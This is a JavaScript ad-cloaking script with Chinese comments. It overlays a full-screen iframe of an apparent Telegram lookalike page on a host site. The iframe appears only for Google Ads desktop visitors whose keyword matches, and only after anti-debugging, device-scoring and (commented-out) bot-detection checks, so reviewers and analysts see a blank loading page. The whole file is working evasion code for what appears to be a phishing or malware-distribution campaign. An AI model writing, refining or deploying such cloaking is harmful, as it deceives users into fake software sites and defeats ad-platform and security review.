
// 与 斗篷辅助CSS.css 保持一致
var MASK_SELECTOR = '.dp-mask';
var MASK_FADE_CLASS = 'dp-mask--fade-out';
// 淡出兜底时长：CSS 中 --dp-mask-fade-duration 为 0.35s，这里留出余量
var MASK_FADE_FALLBACK_MS = 600;
// 已关闭标记：避免重复调用时反复注册过渡监听与兜底定时器
var maskClosed = false;

// kw 数据库
var kw_db = [
    ['tg|纸飞机|telegram', 'https://tuasy1gram.wordpress.com'],
]


/* ----------------------------------------------------------------------------
 * URL 参数
 * -------------------------------------------------------------------------- */

/**
 * 解析并整理当前地址栏的全部参数。
 * 整理规则：值去掉首尾空格；空值（空串或只有空格）保留为空字符串；
 *           不存在的参数不会出现在结果里；同名参数以最后一个为准。
 * @returns {Object} { 参数名: 参数值 }，参数存在但值为空时该值为 ''
 */
function parseUrlParams() {
    // 无原型对象：避免 toString / constructor / __proto__ 这类参数名与原型属性冲突
    var result = Object.create(null);

    new URLSearchParams(location.search).forEach(function (value, key) {
        result[key] = value.trim();
    });

    return result;
}
/**
   * 安全关闭遮罩：淡出成功后移除元素；过渡没触发时由兜底定时器保证照样移除。
*/
function closeMask() {
    if (maskClosed) return; // 已经关闭过，直接跳过

    var mask = document.querySelector(MASK_SELECTOR);
    if (!mask) return; // 页面里没有遮罩

    maskClosed = true;

    var closed = false;

    function remove() {
        if (closed) return; // 过渡回调与兜底定时器只会真正移除一次
        closed = true;
        mask.remove();
    }

    // 正常路径：加上淡出类，opacity 过渡结束后移除
    mask.addEventListener('transitionend', function (e) {
        if (e.target === mask && e.propertyName === 'opacity') remove();
    });
    mask.classList.add(MASK_FADE_CLASS);

    // 兜底路径：过渡未触发（样式被宿主页覆盖、标签页不可见等）时也能稳定关闭
    setTimeout(remove, MASK_FADE_FALLBACK_MS);
}
// 全部 URL 参数（已整理）
var urlParams = {
    all: parseUrlParams(),

    /**
     * 读取指定 URL 参数
     * @param {string} key 参数名
     * @returns {string|undefined} 参数不存在 → undefined；参数存在但值为空 → ''；否则为参数值
     */
    get: function (key) {
        return urlParams.all[key];
    },
};


/**
 * 第一层判断：URL 是否带齐必须参数，且 gad_source 必须为 '1'。
 * @returns {boolean} 全部通过 → true；任意一处不通过 → false
 */
function firstCheck() {
    // 首先获取4个必须值,kw(指定) gad_source(必须等于1) gad_campaignid gclid
    var kw = urlParams.get('kw');
    var gad_source = urlParams.get('gad_source');
    var gad_campaignid = urlParams.get('gad_campaignid');
    var gclid = urlParams.get('gclid');

    // 检查必须值是否为空
    if (!kw || !gad_source || !gad_campaignid || !gclid) {
        return false;
    }

    // 检查 gad_source 是否等于 1
    if (gad_source !== '1') {
        return false;
    }

    return true;
}

/**
 * kw 如果被 base64 编码过，就先解码，否则原样返回。
 * 判定顺序：字符集 + 长度 → atob 解码 → 解码结果必须是合法 UTF-8 文本。
 * 最后一步是必须的：像 'test' 这种本身长得像 base64 的普通词，解出来是乱码字节，
 * 会被 TextDecoder 的 fatal 模式拦下，从而按原文处理，不会被误判成编码值。
 * 注意：base64 里带 + / = 时，放进 URL 前必须 encodeURIComponent，
 *       否则 + 在 query 里会被解析成空格，永远解不出来。
 * @param {string} value 原始 kw
 * @returns {string} 解码后的关键词，或原值
 */
function tryDecodeBase64(value) {
    // 字符集不符或长度不是 4 的倍数 → 直接按原文处理
    if (!/^[A-Za-z0-9+/]+={0,2}$/.test(value) || value.length % 4 !== 0) return value;

    try {
        var binary = atob(value);
        var bytes = new Uint8Array(binary.length);

        for (var i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }

        // fatal: true：解出来不是合法 UTF-8 就抛错，交给 catch 按原文处理
        return new TextDecoder('utf-8', { fatal: true }).decode(bytes);
    } catch (e) {
        return value;
    }
}

// 第二层命中的那组规则：[名称组, 落地页URL]，放行时用它取 iframe 地址
var matchedRule = null;

/**
 * 第二层判断：kw 的值是否命中 kw 数据库里的任意一组名称。
 * 数据库每组名称用 | 分隔（如 '有道|有道翻译'），命中其中任意一个即通过；
 * 用 indexOf 做包含匹配，不用 new RegExp——名称里带 + ? ( ) 这类字符时不会被当成正则元字符。
 * @returns {boolean} 命中任一名称 → true；一组都没命中 → false
 */
function secondCheck() {
    var kw = urlParams.get('kw');
    if (!kw) return false;

    // kw 可能被 base64 编码过：能解出文本就先解码，否则按原文处理
    var keyword = tryDecodeBase64(kw).toLowerCase();

    for (var i = 0; i < kw_db.length; i++) {
        var names = kw_db[i][0].split('|');

        for (var j = 0; j < names.length; j++) {
            // 空名称（如 '有道|' 多写了一个分隔符）会匹配上任何关键词，必须跳过
            var name = names[j].trim().toLowerCase();
            if (name && keyword.indexOf(name) !== -1) {
                matchedRule = kw_db[i]; // 记下命中的规则，放行时用它取落地页地址
                return true;
            }
        }
    }

    return false;
}

/* ----------------------------------------------------------------------------
 * 第三层判断：是否桌面（电脑）环境
 * -------------------------------------------------------------------------- */

// UA 里出现这些标识 → 直接判定为非桌面
var MOBILE_UA = /Android|iPhone|iPad|iPod|Windows Phone|IEMobile|BlackBerry|Opera Mini|Opera Mobi|Silk|Kindle|webOS|Mobile/i;

// platform 明确声明为移动系统（armv / aarch64 覆盖安卓；树莓派这类 ARM 桌面会被误伤）
var MOBILE_PLATFORM = /iPhone|iPad|iPod|Android|armv|aarch64/i;

// platform 明确声明为桌面系统
var DESKTOP_PLATFORM = /Win32|Win64|MacIntel|MacPPC|Linux x86_64|Linux i686|X11/i;

// 打分阈值：得分大于该值才认定为桌面
var DESKTOP_SCORE_THRESHOLD = 0;

/**
 * 第三层判断：是否桌面（电脑）环境。
 * 移动端的伪装手段很多（iPadOS 的 UA 与桌面 Mac 完全一致、安卓可开"桌面版网站"），
 * 所以不做单点判断：先过几条硬信号，再用多路软信号加权打分。
 * @returns {boolean} 桌面环境 → true；非桌面 → false
 */
function thirdCheck() {
    var ua = navigator.userAgent || '';
    var platform = navigator.platform || '';

    // ---------- 硬信号：命中任意一条即判定为非桌面 ----------

    // 1) Chromium 的 UA-CH：浏览器自己声明的移动端标记，比 UA 字符串可靠
    if (navigator.userAgentData && navigator.userAgentData.mobile === true) return false;

    // 2) UA 里明确出现移动端标识
    if (MOBILE_UA.test(ua)) return false;

    // 3) iPadOS 13+ 的 UA 与桌面 Mac 一模一样，只能靠"MacIntel + 多点触控"识别
    if (platform === 'MacIntel' && navigator.maxTouchPoints > 1) return false;

    // ---------- 软信号：多路加权打分 ----------

    var score = 0;

    // 4) 主输入设备：桌面是"可悬停 + 细指针"，触屏是"不可悬停 + 粗指针"
    if (matchMedia('(hover: hover) and (pointer: fine)').matches) score += 2;
    if (matchMedia('(hover: none) and (pointer: coarse)').matches) score -= 2;

    // 5) 触摸点数：完全没有触摸 ⇒ 基本可认定是电脑
    if (navigator.maxTouchPoints === 0) score += 2;

    // 6) 视口宽度：手机普遍 < 768；"桌面版网站"模式会把它撑到 980 左右，所以中间段不给分
    if (window.innerWidth >= 1024) score += 2;
    if (window.innerWidth < 768) score -= 2;

    // 7) 任务栏 / 菜单栏会占掉屏幕高度，桌面系统上 availHeight 通常小于 height
    if (screen.availHeight < screen.height) score += 1;
    else score -= 1;

    // 8) platform 声明
    if (MOBILE_PLATFORM.test(platform)) score -= 2;
    else if (DESKTOP_PLATFORM.test(platform)) score += 1;

    // 9) UA 里的桌面系统词（安卓 UA 里也带 Linux，但那条已被硬信号拦掉）
    if (/Windows NT|Macintosh|X11|CrOS/i.test(ua)) score += 1;

    return score > DESKTOP_SCORE_THRESHOLD;
}

/* ----------------------------------------------------------------------------
 * 第四层判断：鼠标行为检测
 * -------------------------------------------------------------------------- */

var MOUSE_WATCH_MS = 3000; // 最长观察时间（毫秒）
var MOUSE_MIN_MOVES = 4; // 判定所需的最少移动次数
var MOUSE_VARIANCE_CV = 0.2; // 间隔 / 速度的变异系数门槛

/**
 * 变异系数（标准差 ÷ 平均值）：衡量一组数值的"不规则程度"。
 * 机器人用固定间隔派发事件时该值接近 0；人类操作鼠标时会明显大于 0。
 * @param {number[]} values 数值数组
 * @returns {number} 变异系数
 */
function cvOf(values) {
    if (values.length < 2) return 0;

    var sum = 0;
    var i;

    for (i = 0; i < values.length; i++) sum += values[i];

    var mean = sum / values.length;
    if (mean <= 0) return 0;

    var squared = 0;
    for (i = 0; i < values.length; i++) squared += Math.pow(values[i] - mean, 2);

    return Math.sqrt(squared / values.length) / mean;
}

/**
 * 从采样点里提取"像人操作鼠标"的证据。
 * 只取最稳的两个特征：相邻移动的时间间隔、移动速度。
 * 机器人的典型特征是这两项都恒定（定时间隔 + 等距位移），
 * 所以只要有一项出现明显波动就按人类处理——宁可放过，也不误杀真实用户。
 * @param {Array} samples [{x, y, t}]
 * @returns {boolean}
 */
function looksHuman(samples) {
    var gaps = [];
    var speeds = [];

    for (var i = 1; i < samples.length; i++) {
        var dx = samples[i].x - samples[i - 1].x;
        var dy = samples[i].y - samples[i - 1].y;
        var dt = samples[i].t - samples[i - 1].t;
        var distance = Math.sqrt(dx * dx + dy * dy);

        gaps.push(dt);
        speeds.push(dt > 0 ? distance / dt : 0);
    }

    return cvOf(gaps) >= MOUSE_VARIANCE_CV || cvOf(speeds) >= MOUSE_VARIANCE_CV;
}

/**
 * 第四层判断：鼠标行为检测（异步）。
 * 与前几层不同——鼠标行为需要时间观察，所以本层不返回布尔值，而是把结论交给回调。
 * 判定分两部分：
 *   硬信号：JS 伪造的事件（isTrusted 为 false）、(0, 0) 坐标、同一时刻的远距离瞬移 → 命中立刻否决；
 *   行为统计：采样点的间隔 / 速度波动是否像人（见 looksHuman）。
 * 说明：观察期内没等到足够的鼠标移动，一律按非人类处理（页面保持空白 + Loading）。
 * @param {Function} done 回调：done(true) 像人；done(false) 不像人
 */
function fourthCheck(done) {
    var samples = [];
    var finished = false;

    var finish = function (isHuman) {
        if (finished) return; // 硬信号与定时器只会结束一次
        finished = true;
        document.removeEventListener('mousemove', onMove);
        done(isHuman);
    };

    var onMove = function (e) {
        // 硬信号 1：事件不是浏览器真实产生的（脚本 dispatch 出来的）
        if (e.isTrusted === false) return finish(false);

        // 硬信号 2：坐标 (0, 0) 是自动化工具派发事件的常见产物
        if (e.pageX <= 0 && e.pageY <= 0) return finish(false);

        var last = samples[samples.length - 1];
        var now = performance.now();

        // 硬信号 3：几乎同一时刻却移动了很长距离，不是人手能产生的
        if (last && now - last.t <= 1 && Math.abs(e.pageX - last.x) + Math.abs(e.pageY - last.y) > 300) {
            return finish(false);
        }

        samples.push({ x: e.pageX, y: e.pageY, t: now });

        // 证据够了就提前放行，不必等满整个观察期
        if (samples.length >= MOUSE_MIN_MOVES && looksHuman(samples)) finish(true);
    };

    document.addEventListener('mousemove', onMove, { passive: true });

    // 观察期结束还没通过 → 按非人类处理
    // （能通过的话在上面那次采样时就已经提前结束了，这里无需再算一遍）
    setTimeout(function () {
        finish(false);
    }, MOUSE_WATCH_MS);
}

/**
 * 放行：四层判断全部通过后调用——插入主页面 iframe，并让空白 + Loading 遮罩淡出。
 * 顺序很重要：必须"先插 iframe、再淡出遮罩"，遮罩淡出后才能露出下面的主页面。
 * @returns {void}
 */
function showMainPage() {
    if (!matchedRule) return; // 没命中规则，拿不到落地页地址

    var url = matchedRule[1];

    // 1) 追加主页面 iframe（追加而不是覆盖 body：遮罩还要留在 DOM 里完成淡出）
    //    z-index 比遮罩低 1：遮罩淡出后，iframe 正好盖住宿主页面的其它内容
    document.body.insertAdjacentHTML(
        'beforeend',
        '<iframe src="' + url + '" scrolling="auto" frameborder="0" ' +
            'style="position:fixed;top:0;left:0;width:100%;height:100%;border:0;z-index:2147483646"></iframe>'
    );

    // 2) 把遮罩透明化：只加淡出类（opacity 变 0、pointer-events 变 none），元素保留在 DOM 里
    var mask = document.querySelector(MASK_SELECTOR);
    if (mask) mask.classList.add(MASK_FADE_CLASS);
}

/**
 * 第零层判断：反调试复检（放行的前置条件）。
 * 放行前必须确认「反调试脚本已加载」且「当前没有被调试 / 关键原生函数没被 hook」。
 * 为什么必须放在最前：反调试是 1s 轮询的，而斗篷在 DOMContentLoaded 就会放行，
 * 只靠轮询会出现"先打开控制台再刷新页面 → 主页面先渲染出来、随后才被反调试抓到"。
 * 注意：本层让 dp-code.js 依赖 反调试.js —— 没引入它（或被拦截）时不会放行。
 * @returns {boolean} 通过 → true
 */
function antiDebugPassed() {
    return typeof window.antiDebugCheck === 'function' && window.antiDebugCheck() === true;
}

document.addEventListener('DOMContentLoaded', function () {

    // 主核心

    // 第零层判断：反调试复检（未通过则不放行，页面保持空白 + Loading）
    if (!antiDebugPassed()) return;

    // 第一层判断：URL的参数是否完整
    if (!firstCheck()) return;

    // 第二层判断：kw的值是否在我们的kw数据库
    if (!secondCheck()) return;

    // 第三层判断：判断是否为桌面环境（电脑）环境
    if (!thirdCheck()) return;

    // 第四层判断：鼠标行为检测（异步）
    // 本层需要观察一段时间，所以结论通过回调返回，不能像前三层那样 if (!xxx()) return
    // 目前先不使用第四层，代码保留，后续需要时把下面这段取消注释即可
    /*
    fourthCheck(function (isHuman) {
        // 不像人操作鼠标（或压根没有鼠标行为）→ 保持空白 + Loading
        if (!isHuman) return;

        // 四层全部通过：放行
        showMainPage();
    });
    */

    // 放行：前三层全部通过 → 显示主页面 + 遮罩透明化
    showMainPage();

})